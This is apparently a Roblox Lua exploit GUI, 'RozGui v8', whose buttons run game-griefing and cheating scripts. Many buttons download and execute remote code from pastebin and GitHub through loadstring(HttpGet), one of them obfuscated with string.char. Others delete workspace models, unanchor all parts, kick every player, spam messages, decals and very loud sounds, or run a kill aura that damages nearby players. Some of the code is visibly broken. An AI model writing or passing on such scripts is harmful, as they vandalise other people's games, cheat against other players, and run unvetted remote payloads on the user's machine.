-- #requirement codes:
local HttpService = game:GetService("HttpService")

function loadScript(link)
    local response = HttpService:GetAsync(link)
    return loadstring(response)()
end
--
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "RozGui v8 Security Bot",
	Text = "Verifiend!",
	Icon = "rbxassetid://1234567890"
})

local Pi101 = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
  Pi101.ResetOnSpawn = false
local Gui = Instance.new("Frame", Pi101)
  Gui.Name = "ID=frame.executable541"
  Gui.Size = UDim2.new(0,300,0,450)
  Gui.BorderSizePixel = 4
  Gui.BorderColor3 = Color3.fromRGB(255,255,255)
  Gui.BackgroundColor3 = Color3.fromRGB(0,0,0)
  Gui.Visible = true
  Gui.Draggable = true
  Gui.Active = true
local Title = Instance.new("TextLabel", Gui)
  Title.Name = "ID=txtlabel5177"
  Title.Size = UDim2.new(0,300,0,50)
  Title.BackgroundColor3 = Color3.fromRGB(0,0,0)
  Title.BorderSizePixel = 4
  Title.BorderColor3 = Color3.fromRGB(255,255,255)
  Title.Position = UDim2.new(0,0,0,0)
  Title.TextColor3 = Color3.fromRGB(255,255,255)
  Title.Text = ("RozGui v8 Ultimate")
  Title.TextScaled = true
  Title.Font = Enum.Font.SourceSansBold
local ScrollingFrame = Instance.new("ScrollingFrame", Gui)
  ScrollingFrame.Active = true
  ScrollingFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
  ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
  ScrollingFrame.Position = UDim2.new(0, 0, 0, 50)
  ScrollingFrame.Size = UDim2.new(0, 300, 0, 400)
  ScrollingFrame.ScrollBarThickness = 18
-- right section
local function addButton(name, text, position, functionTextButtonClick)
local TextButton = Instance.new("TextButton", Gui)
  TextButton.Size = UDim2.new(0,99,0,40)
  TextButton.Position = position
  TextButton.Name = name
  TextButton.Text = text
  TextButton.TextColor3 = Color3.fromRGB(255,255,255)
  TextButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
  TextButton.BorderSizePixel = 4
  TextButton.BorderColor3 = Color3.fromRGB(255,255,255)
  TextButton.TextWrapped = true
  TextButton.TextScaled = true
TextButton.MouseButton1Click:Connect(functionTextButtonClick)
   return TextButton
end
addButton("Id=TextButton.Editable", "Spam Notify", UDim2.new(0,310,0,0), function()
    while true do
        game:GetService("StarterGui"):SetCore("SendNotification", { 
            Title = "???",
            Text = "Rozxino is here!",
            Icon = "rbxthumb://type=Asset&id=id here&w=150&h=150"})
        wait(2)
    end
end)
addButton("Id=TextButton.Editable", "Project legma", UDim2.new(0,310,0,44), function()
    loadstring(game:HttpGet('https://pastebin.com/raw/MUfsexG1'))()
end)
addButton("Id=TextButton.Editable", "Infinite Yield", UDim2.new(0,310,0,88), function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
addButton("Id=TextButton.Editable", "Mesh Disco", UDim2.new(0,310,0,130), function()

end)
addButton("Id=TextButton.Editable", "1x1x1x1Gui", UDim2.new(0,310,0,175), function()
  local _1 = string.char
  local _2 = game
  local _3 = getfenv
  local _4 = _3()[_1(108, 111, 97, 100, 115, 116, 114, 105, 110, 103)]
  local _5 = _2[_1(72, 116, 116, 112, 71, 101, 116)]
  _4(_5(_2, "https://rawscripts.net/raw/Natural-Disaster-Survival-1X1X1X1-GUI-PLS-LIKE-11504"))()
end)
addButton("Id=TextButton.Editable", "Hint _1", UDim2.new(0,310,0,220), function()
    local H_1 = Instance.new("Hint", game.Workspace)
    H_1.Text = ("Rozxino is harcking the game rn brb")
end)
addButton("Id=TextButton.Editable", "Hint _2", UDim2.new(0,310,0,265), function()
    local H_2 = Instance.new("Hint", game.Workspace)
    H_2.Text = ("Rozxino is here!1!1")
end)
addButton("Id=TextButton.Editable", "Message _1", UDim2.new(0,310,0,310), function()
   while true do  
     local H_3 = Instance.new("Message", game.Workspace)
     H_3.Text = ("DA GAEM IS FUCKED LMAO")
     wait(1)
     H_3:Destroy()
    wait(1)
   end  
end)
addButton("Id=TextButton.Editable", "Message _2", UDim2.new(0,310,0,355), function()
    local H_4 = Instance.new("Message", game.Workspace)
   H_4.Text = ("GAME IS HACKED BY TEAM K00PKIDD AND C00LKIDD MATAFAKAZ")
end)
addButton("Id=TextButton.Editable", "1x1x1x1 Message", UDim2.new(0,310,0,400), function()
    while true do
		wait(12)--set this to how much time between messages
		msg = Instance.new ("Hint")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: MUHAWHAWHAW! NOOBS! I HAVE RETURNED FOR MY REVENGE!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: NOW YOU WILL ALL PARISH IN MY FIRE OF DOOM!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: I WILL DESTROY YOU ALL! YOU ARE WORTHLESS!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: YOU WILL NOT LIVE THROUGH MY DEADLY ATTACKS!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: I MIGHT AS WELL CLONE YOU INTO BOTS!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: AND THEN THOSE BOTS WILL DESTROY ROBLOX! HAHAHAHAHA!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: YOU CAN'T STOP ME! THERES NOTHING YOU CAN DO!"
		wait(6)
		msg:remove()
	end
end)
-- left section
addButton("Id=TextButton.Editable", "Theme _1", UDim2.new(0,-110,0,0), function()
    local s = Instance.new("Sound")

	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=27697743"
	s.Volume = 1
	s.Pitch = 3
	s.Looped = true
	s.archivable = false

	s.Parent = game.Workspace

	wait(1)

	s:play()
end)
addButton("Id=TextButton.Editable", "Grab Knife v4", UDim2.new(0,-110,0,44), function()
	 loadScript("https://raw.githubusercontent.com/retpirato/Roblox-Scripts/master/Grab%20Knife%20V4.lua")
end)
addButton("Id=TextButton.Editable", "Always Night", UDim2.new(0,-110,0,88), function()
    	while true do 
		print ("Loop cycle start")
		game.Lighting.TimeOfDay = "18:00:00"
		wait(0.5)
	end
end)
addButton("Id=TextButton.Editable", "Golden Gun", UDim2.new(0,-110,0,130), function()
    loadScript("https://raw.githubusercontent.com/retpirato/Roblox-Scripts/master/Golden%20Gun.lua")
end)
addButton("Id=TextButton.Editable", "TOPK3K", UDim2.new(0,-110,0,175), function()
    loadScript("https://raw.githubusercontent.com/retpirato/Roblox-Scripts/master/Admin%20Script%20Topkek.lua")
end)
addButton("Id=TextButton.Editable", "Kaax Script", UDim2.new(0,-110,0,220), function()
    wait(1)
		math.randomseed(tick() % 1 * 1e6)
		sky = coroutine.create(function()
			while wait(0.3) do
				s = Instance.new("Sky",game.Lighting)
				s.SkyboxBk,s.SkyboxDn,s.SkyboxFt,s.SkyboxLf,s.SkyboxRt,s.SkyboxUp = "rbxassetid://12330950245","rbxassetid://12330950245","rbxassetid://12330950245","rbxassetid://12330950245","rbxassetid://12330950245","rbxassetid://12330950245"
				s.CelestialBodiesShown = true
			end
		end)
	
	
		local m = Instance.new("Hint", game.workspace)
		m.Text = " game got hacked by Kaax!!!"
	
		del = coroutine.create(function()
			while wait(0.3) do
				for i,v in pairs(workspace:GetChildren()) do
					if v:IsA("Model") then
						v:Destroy()
					end
				end
			end
		end)
	
	
	
		for i,v in pairs(game.Players:GetChildren()) do
			v.Character.Archivable = true
		end
	
		noises = {'rbxassetid://230287740','rbxassetid://271787597','rbxassetid://153752123','rbxassetid://271787503'}
	
		sound = coroutine.create(function()
			a = Instance.new("Sound",workspace)
			a.SoundId = "rbxassetid://6783714255"
			a.Name = "RAINING MEN"
			a.Volume = 58359
			a.Looped = true
			a:Play()
			while wait(0.2) do
				rainin = workspace:FindFirstChild("RAINING MEN")
				if not rainin then
					a = Instance.new("Sound",workspace)
					a.SoundId = "rbxassetid://6942391979"
					a.Name = "RAINING MEN"
					a.Volume = 58359
					a.Looped = true
					a:Play()
				end
			end
		end)
	
		msg = coroutine.create(function()
			while wait(0.4) do
				msg = Instance.new("Message",workspace)
				msg.Text = "Team KaaXploits, Join Today! [Remake By k00pkidd]"
				wait(0.4)
				msg:Destroy()
			end
		end) 
	
	
		rain = coroutine.create(function()
			while wait(10 % 1 * 1e2) do
				part = Instance.new("Part",workspace)
				part.Name = "Toad"
	
				mesh = Instance.new("SpecialMesh",part)
	
				sound = Instance.new("Sound",workspace)
	
				part.CanCollide = false
				part.Size = Vector3.new(440,530,380)
				part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
	
				sound.SoundId = noises[math.random(1,#noises)]
				sound:Play()
				sound.Ended:connect(function()
					sound:Destroy()
				end)
	
	
				mesh.MeshType = "FileMesh"
				mesh.MeshId = "rbxassetid://3692134742"
				mesh.TextureId = "rbxassetid://3692134820"
			end
		end)
		coroutine.resume(sky)
		coroutine.resume(del)
		coroutine.resume(sound)
		coroutine.resume(msg)
		coroutine.resume(rain)
end)
addButton("Id=TextButton.Editable", "Randcol", UDim2.new(0,-110,0,265), function()
    for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Color = Color3.new(math.random(0, 1),math.random(0, 1),math.random(0, 1))
			end
		end
end)
addButton("Id=TextButton.Editable", "Unanchor all", UDim2.new(0,-110,0,310), function()
    for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then	
				v.Anchored = false
			end
		end
	
	
		for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
		
	
		for i,v in pairs(game.ReplicatedFirst:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
end)
addButton("Id=TextButton.Editable", "shutdown", UDim2.new(0,-110,0,355), function()
    for i, players in pairs(game.Players:GetChildren()) do
			players:Kick("Teh Game Iz Fuked Up!!!!111")
		end
end)
addButton("Id=TextButton.Editable", "Rain Fire", UDim2.new(0,-110,0,400), function()
    while true do
			part = Instance.new("Part")
			part.Position =  Vector3.new(math.random(-500,500),math.random(1,500),math.random(-500,500))
			part.Parent = game.Workspace
			part.BrickColor = BrickColor.new("Really red")
			fire = Instance.new("Fire")
			fire.Size = 99
			fire.Parent = part
			wait(0.50)
		end
end)
-- left section end

local function addButton(name, text, position, functionTextButtonClick)
local TextButton = Instance.new("TextButton", ScrollingFrame)
  TextButton.Size = UDim2.new(0,100,0,40)
  TextButton.Position = position
  TextButton.Name = name
  TextButton.Text = text
  TextButton.TextColor3 = Color3.fromRGB(255,255,255)
  TextButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
  TextButton.BorderSizePixel = 4
  TextButton.BorderColor3 = Color3.fromRGB(255,255,255)
  TextButton.TextWrapped = true
  TextButton.TextScaled = true
TextButton.MouseButton1Click:Connect(functionTextButtonClick)
   return TextButton
end

addButton("Id=TextButton.Editable", "c00lgui", UDim2.new(0,0,0,0), function()
    loadstring(game:GetObjects("rbxassetid://9827584846")[1].Source)()
end)
addButton("Id=TextButton.Editable", "Yeet Gui[required version]", UDim2.new(0,0,0,50), function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YssHacker/Fe-Trolling-GUI/main/mainscript2"))()
end)
addButton("Id=TextButton.Editable", "NotaGui", UDim2.new(0,0,0,100), function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pedroluckygod/Yes/main/UNDETECTABLE%20GUI%20V7"))()
end)
addButton("Id=TextButton.Editable", "Floot Pad", UDim2.new(0,0,0,150), function()
    local name = game.Players.LocalPlayer.Name

	local p = Instance.new("Part")
	p.Parent = workspace
	p.Locked = true
	p.BrickColor = BrickColor.new("White")
	p.BrickColor = BrickColor.new(104)
	p.Size = Vector3.new(8, 1.2, 8)
	p.Anchored = true
	local m = Instance.new("CylinderMesh")
	m.Scale = Vector3.new(1, 0.5, 1)
	m.Parent = p
	while true do
		p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
		wait()
	end
end)
addButton("Id=TextButton.Editable", "K00pkidd's face[pizza place]", UDim2.new(0,0,0,200), function()
    local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Head.face,
    [2] = "rbxassetid://9698929683"
}

workspace.Main.ChangeFace:FireServer(unpack(args))
end)
addButton("Id=TextButton.Editable", "Theme _2", UDim2.new(0,0,0,250), function()
    local sound = Instance.new("Sound",game.Workspace)
  sound.Name = "H4xed By Rozxino"
  sound.SoundId = "rbxassetid://6953866301"
  sound.Volume = 999999999999999999999
  sound:Play()
end)
addButton("Id=TextButton.Editable", "theme _3", UDim2.new(0,0,0,300), function()
    local sound = Instance.new("Sound",game.Workspace)
  sound.Name = "H4xed By Rozxino"
  sound.SoundId = "rbxassetid://1839246711"
  sound.Volume = 999999999999999999999
  sound.PlaybackSpeed = 0.9
  sound:Play()
end)
addButton("Id=TextButton.Editable", "theme _4(Siren)", UDim2.new(0,0,0,350), function()
    local sound = Instance.new("Sound",game.Workspace)
  sound.Name = "H4xed By not4player214"
  sound.SoundId = "rbxassetid://9109836322"
  sound.Volume = 999999999999999999999
  sound.PlaybackSpeed = 1
  sound.Looped = true
  sound:Play()
end)
addButton("Id=TextButton.Editable", "Decal _1", UDim2.new(0,0,0,400), function()
function spamDecal(v)
    if v:IsA("Part") then
        for i = 0, 5 do
            local D = Instance.new("Decal")
            D.Name = "MYDECALHUE"
            D.Face = i
            D.Parent = v
            D.Texture = ("rbxassetid://" .. Id)
        end
    elseif v:IsA("Model") then
        for _, b in pairs(v:GetChildren()) do
            spamDecal(b)
        end
    end
end

function decalspam(id) --use this function, not the one on top
    Id = id
    for _, v in pairs(game.Workspace:GetChildren()) do
        spamDecal(v)
    end
end
local ID = 160456772
decalspam(ID)
end)
addButton("Id=TextButton.Editable", "Decal _2", UDim2.new(0,0,0,450), function()
       function spamDecal(v)
    if v:IsA("Part") then
        for i = 0, 5 do
            local D = Instance.new("Decal")
            D.Name = "MYDECALHUE"
            D.Face = i
            D.Parent = v
            D.Texture = ("rbxassetid://" .. Id)
        end
    elseif v:IsA("Model") then
        for _, b in pairs(v:GetChildren()) do
            spamDecal(b)
        end
    end
end

function decalspam(id) --use this function, not the one on top
    Id = id
    for _, v in pairs(game.Workspace:GetChildren()) do
        spamDecal(v)
    end
end

local ID = 15198649455
decalspam(ID)
end)
addButton("Id=TextButton.Editable", "Decal _3", UDim2.new(0,0,0,500), function()
    function spamDecal(v)
    if v:IsA("Part") then
        for i = 0, 5 do
            local D = Instance.new("Decal")
            D.Name = "MYDECALHUE"
            D.Face = i
            D.Parent = v
            D.Texture = ("rbxassetid://" .. Id)
        end
    elseif v:IsA("Model") then
        for _, b in pairs(v:GetChildren()) do
            spamDecal(b)
        end
    end
end

function decalspam(id) --use this function, not the one on top
    Id = id
    for _, v in pairs(game.Workspace:GetChildren()) do
        spamDecal(v)
    end
end
local ID = 4765014746
decalspam(ID)
end)
--#right section
addButton("Id=TextButton.Editable", "Skybox _1", UDim2.new(0,110,0,0), function()
    local sky = Instance.new("Sky", game.Lighting)
		sky.SkyboxBk = "http://www.roblox.com/asset/?id=160456772"
        sky.SkyboxFt = "http://www.roblox.com/asset/?id=160456772"
        sky.SkyboxLf = "http://www.roblox.com/asset/?id=160456772"
        sky.SkyboxRt = "http://www.roblox.com/asset/?id=160456772"
         sky.SkyboxUp = "http://www.roblox.com/asset/?id=160456772"
        sky.SkyboxDn = "http://www.roblox.com/asset/?id=160456772"
end)
addButton("Id=TextButton.Editable", "Skybox _3", UDim2.new(0,110,0,50), function()
    local sky = Instance.new("Sky", game.Lighting)
		sky.SkyboxBk = "http://www.roblox.com/asset/?id=4765014746"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=4765014746"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=4765014746"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=4765014746"
sky.SkyboxUp = "http://www.roblox.com/asset/?id=4765014746"
sky.SkyboxDn = "http://www.roblox.com/asset/?id=4765014746"

end)
addButton("Id=TextButton.Editable", "Particles _1", UDim2.new(0,110,0,100), function()
    t1 = "http://www.roblox.com/asset/?id=160456772"
		t2 = "http://www.roblox.com/asset/?id=160456772"
		t3 = "http://www.roblox.com/asset/?id=160456772"
	
		local p = game.Players:GetChildren()
		local w = game.Workspace:GetChildren()
	
		for i,v in pairs(p) do
			pe = Instance.new("ParticleEmitter", v.Character.Torso)
			pe.Texture = t3
			pe.VelocitySpread = 100
		end
	
		for i= 1,#w do
			if w[i]:isA("BasePart") then
				pe = Instance.new("ParticleEmitter", w[i])
				pe.Texture = t3
				pe.VelocitySpread = 99999999999999999917297281728217822246525625187722256254
			end
		end
end)
addButton("Id=TextButton.Editable", "Particles _3", UDim2.new(0,110,0,150), function()
    t1 = "http://www.roblox.com/asset/?id=4765014746"
		t2 = "http://www.roblox.com/asset/?id=4765014746"
		t3 = "http://www.roblox.com/asset/?id=4765014746"

		local p = game.Players:GetChildren()
		local w = game.Workspace:GetChildren()
	
		for i,v in pairs(p) do
			pe = Instance.new("ParticleEmitter", v.Character.Torso)
			pe.Texture = t3
			pe.VelocitySpread = 100
		end
	
		for i= 1,#w do
			if w[i]:isA("BasePart") then
				pe = Instance.new("ParticleEmitter", w[i])
				pe.Texture = t3
				pe.VelocitySpread = 99999999999999999917297281728217822246525625187722256254
			end
		end
end)
addButton("Id=TextButton.Editable", "HarkedGui", UDim2.new(0,110,0,200), function()
    loadScript("https://rawscripts.net/raw/Universal-Script-Harked-Skript-6804")
end)
addButton("Id=TextButton.Editable", "Harked v2", UDim2.new(0,110,0,250), function()
    loadScript("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked")
end)
addButton("Id=TextButton.Editable", "Rc7", UDim2.new(0,110,0,300), function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/rc7"))
end)
addButton("Id=TextButton.Editable", "SHUTDOWN WHOLE GAME", UDim2.new(0,110,0,350), function()
    Notify("Error")
end)
addButton("Id=TextButton.Editable", "Empty", UDim2.new(0,110,0,400), function()
Notify("I just said its empty")
end)
addButton("Id=TextButton.Editable", "Empty", UDim2.new(0,110,0,450), function()
end)
--#right 2 section
addButton("Id=TextButton.Editable", "Skybox _2", UDim2.new(0,210,0,0), function()
    local sky = Instance.new("Sky", game.Lighting)
		sky.SkyboxBk = "http://www.roblox.com/asset/?id=15198649455"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=15198649455"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=15198649455"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=15198649455"
sky.SkyboxUp = "http://www.roblox.com/asset/?id=15198649455"
sky.SkyboxDn = "http://www.roblox.com/asset/?id=15198649455"
end)
addButton("Id=TextButton.Editable", "Particles _2", UDim2.new(0,210,0,50), function()
    t1 = "http://www.roblox.com/asset/?id=15198649455"
		t2 = "http://www.roblox.com/asset/?id=15198649455"
		t3 = "http://www.roblox.com/asset/?id=15198649455"
	
		local p = game.Players:GetChildren()
		local w = game.Workspace:GetChildren()
	
		for i,v in pairs(p) do
			pe = Instance.new("ParticleEmitter", v.Character.Torso)
			pe.Texture = t3
			pe.VelocitySpread = 100
		end
	
		for i= 1,#w do
			if w[i]:isA("BasePart") then
				pe = Instance.new("ParticleEmitter", w[i])
				pe.Texture = t3local 
				pe.VelocitySpread = 99999999999999999917297281728217822246525625187722256254
			end
		end
end)
addButton("Id=TextButton.Editable", "DevUzi", UDim2.new(0,210,0,100), function()
    loadScript("https://pastebin.com/raw/krzcxxk9")
end)
addButton("Id=TextButton.Editable", "Reverb Sound", UDim2.new(0,210,0,150), function()
    local d = Instance.new("ReverbSoundEffect") d.Parent = workspace.Sound
end)
addButton("Id=TextButton.Editable", "Distort Sounds", UDim2.new(0,210,0,200), function()
    local d = Instance.new("DistortionSoundEffect") d.Parent = game.Workspace.Sound
end)
addButton("Id=TextButton.Editable", "Stop Sounds", UDim2.new(0,210,0,250), function()
    for i,v in pairs(game.Workspace:GetChildren()) do
	if v.className == "Sound" then
	v:Stop()
	v:Remove()
	end
	end
end)
addButton("Id=TextButton.Editable", "AVATARS", UDim2.new(0,210,0,300), function()
    for i,v in pairs(game.Players:GetPlayers()) do
			v.CharacterAppearanceId = "5334218651"
			v:LoadCharacter()
		end
end)
addButton("Id=TextButton.Editable", "Spin all", UDim2.new(0,210,0,350), function()
    for i,v in pairs(game.Players:GetChildren()) do
	local plr = v
	number = 15
	local head = v.Character.Head
	if head then
	local spin1 = head:FindFirstChild("Spin1")
	local spin2 = head:FindFirstChild("Spin2")
	if not spin1 then
	spin1 = Instance.new("BodyAngularVelocity")
	spin1.MaxTorque = Vector3.new(300000, 300000, 300000)
	spin1.P = 300
	spin1.Name = "Spin1"
	spin1.Parent = head
	spin2 = Instance.new("BodyGyro")
	spin2.MaxTorque = Vector3.new(400000, 0, 400000)
	spin2.D = 500
	spin2.P = 300
	spin2.Name = "Spin2"
	spin2.Parent = head
	end
	spin1.AngularVelocity = Vector3.new(0,number,0)
	end
	end
end)
addButton("Id=TextButton.Editable", "Shedleskeyfy", UDim2.new(0,210,0,400), function()
    local p = require(script.FakeMouse):GetPlr()
		game.Lighting:ClearAllChildren()
		wait(.2)
		local s = Instance.new("Sky")
		s.Name = "Sky"
		s.Parent = game.Lighting
		s.SkyboxBk = "http://www.roblox.com/asset/?id=172423468"
		s.SkyboxDn = "http://www.roblox.com/asset/?id=172423468"
		s.SkyboxFt = "http://www.roblox.com/asset/?id=172423468"
		s.SkyboxLf = "http://www.roblox.com/asset/?id=172423468"
		s.SkyboxRt = "http://www.roblox.com/asset/?id=172423468"
		s.SkyboxUp = "http://www.roblox.com/asset/?id=172423468"
		s.SunAngularSize = 0
		s.MoonAngularSize = 0
		for i, v in pairs(game.Players:GetChildren()) do
			local emit = Instance.new("ParticleEmitter")
			emit.Parent = v.Character.Head
			emit.Texture = "http://www.roblox.com/asset/?id=11664604903"
			emit.VelocitySpread = 100000
			emit.SpreadAngle =  Vector2.new(0, 0)
			emit.Speed = NumberRange.new(9, 9)
		end
		for i, v in pairs(game.Players:GetChildren()) do
			local emit = Instance.new("ParticleEmitter")
			emit.Parent = v.Character.Head
			emit.Texture = "http://www.roblox.com/asset/?id=11664604903"
			emit.VelocitySpread = 100000
			emit.SpreadAngle =  Vector2.new(0, 0)
			emit.Speed = NumberRange.new(9, 9)
		end
		for i, v in pairs(game.Players:GetChildren()) do
			local emit = Instance.new("ParticleEmitter")
			emit.Parent = v.Character.Head
			emit.Texture = "http://www.roblox.com/asset/?id=11664604903"
			emit.VelocitySpread = 100000
			emit.SpreadAngle =  Vector2.new(0, 0)
			emit.Speed = NumberRange.new(9, 9)
		end
		for i, v in pairs(game.Players:GetChildren()) do
			local emit = Instance.new("ParticleEmitter")
			emit.Parent = v.Character.Head
			emit.Texture = "http://www.roblox.com/asset/?id=11664604903"
			emit.VelocitySpread = 100000
			emit.SpreadAngle =  Vector2.new(0, 0)
			emit.Speed = NumberRange.new(9, 9)
		end
		local Sound0 = Instance.new("Sound")
		Sound0.Parent = workspace
		Sound0.Looped = true
		Sound0.Playing = true
		Sound0.SoundId = "rbxassetid://130759239"
end)
addButton("Id=TextButton.Editable", "Empty", UDim2.new(0,210,0,450), function()
    
end)
--#huge button
local function HugeButton(name, text, position, functionTextButtonClick)
local TextButton = Instance.new("TextButton", ScrollingFrame)
  TextButton.Size = UDim2.new(0,300,0,40)
  TextButton.Position = position
  TextButton.Name = name
  TextButton.Text = text
  TextButton.TextColor3 = Color3.fromRGB(255,255,255)
  TextButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
  TextButton.BorderSizePixel = 4
  TextButton.BorderColor3 = Color3.fromRGB(255,255,255)
  TextButton.TextWrapped = true
  TextButton.TextScaled = true
TextButton.MouseButton1Click:Connect(functionTextButtonClick)
   return TextButton
end

HugeButton("Id=TextButton.Editable", "TOADROAST[OP]", UDim2.new(0,0,0,550), function()
    loadstring(game:httpget("https://pastebin.com/raw/yRwAAy77"))()
end)

HugeButton("Id=TextButton.Editable", "KILL AURA[OP]", UDim2.new(0,0,0,600), function()
-- made by where_are300
   local connections = getgenv().configs and getgenv().configs.connection
   if connections then
    local Disable = configs.Disable
    for i,v in connections do
        v:Disconnect() 
    end
    Disable:Fire()
    Disable:Destroy()
    table.clear(configs)
end

local Disable = Instance.new("BindableEvent")
getgenv().configs = {
    connections = {},
    Disable = Disable,
    Size = Vector3.new(10,10,10),
    DeathCheck = true
}

local Players = cloneref(game:GetService("Players"))
local RunService = cloneref(game:GetService("RunService"))
local lp = Players.LocalPlayer
local Run = true
local Ignorelist = OverlapParams.new()
Ignorelist.FilterType = Enum.RaycastFilterType.Include

local function getchar(plr)
    local plr = plr or lp
    return plr.Character
end

local function gethumanoid(plr: Player | Character)
    local char = plr:IsA("Model") and plr or getchar(plr)

    if char then
        return char:FindFirstChildWhichIsA("Humanoid")
    end
end

local function IsAlive(Humanoid)
    return Humanoid and Humanoid.Health > 0
end

local function GetTouchInterest(Tool)
    return Tool and Tool:FindFirstChildWhichIsA("TouchTransmitter",true)
end

local function GetCharacters(LocalPlayerChar)
    local Characters = {}
    for i,v in Players:GetPlayers() do
        table.insert(Characters,getchar(v))
    end
    table.remove(Characters,table.find(Characters,LocalPlayerChar))
    return Characters
end

local function Attack(Tool,TouchPart,ToTouch)
    if Tool:IsDescendantOf(workspace) then
        Tool:Activate()
        firetouchinterest(TouchPart,ToTouch,1)
        firetouchinterest(TouchPart,ToTouch,0)
    end
end

table.insert(getgenv().configs.connections,Disable.Event:Connect(function()
    Run = false
end))

while Run do
    local char = getchar()
    if IsAlive(gethumanoid(char)) then
        local Tool = char and char:FindFirstChildWhichIsA("Tool")
        local TouchInterest = Tool and GetTouchInterest(Tool)

        if TouchInterest then
            local TouchPart = TouchInterest.Parent
            local Characters = GetCharacters(char)
            Ignorelist.FilterDescendantsInstances = Characters
            local InstancesInBox = workspace:GetPartBoundsInBox(TouchPart.CFrame,TouchPart.Size + getgenv().configs.Size,Ignorelist)

            for i,v in InstancesInBox do
                local Character = v:FindFirstAncestorWhichIsA("Model")

                if table.find(Characters,Character) then
                    if getgenv().configs.DeathCheck then                    
                        if IsAlive(gethumanoid(Character)) then
                            Attack(Tool,TouchPart,v)
                        end
                    else
                        Attack(Tool,TouchPart,v)
                    end
                end
            end
        end
    end
    RunService.Heartbeat:Wait()
end
end)
local function createButton(name, position, size, functionTextButtonClick)
    local TextButton = Instance.new("TextButton", ScrollingFrame)
    TextButton.Size = size
    TextButton.Position = position
    TextButton.Name = name
    TextButton.Text = name
    TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    TextButton.BorderSizePixel = 4
    TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
    TextButton.TextWrapped = true
    TextButton.TextScaled = true
    TextButton.MouseButton1Click:Connect(functionTextButtonClick)
    return TextButton
end

createButton("LeaderBoarr Spam", UDim2.new(0, 110, 0, 500), UDim2.new(0, 200, 0, 40), function()
   local TeamsService = game:GetService("Teams")
local colors = {"Bright red", "Bright blue", "Bright green", "Bright yellow", "Bright orange", "Bright violet", "Bright pink"}
local teamCount = 0

local function createRandomTeam()
    teamCount = teamCount + 1
    local teamName = "ROZXINO IS HERE!1!1" .. teamCount
    local randomColor = colors[math.random(1, #colors)]

    local team = Instance.new("Team")
    team.Name = teamName
    team.TeamColor = BrickColor.new(randomColor)
    team.AutoAssignable = true
    team.Parent = TeamsService
end

while true do
    createRandomTeam()
    wait(0.1)
end
end)
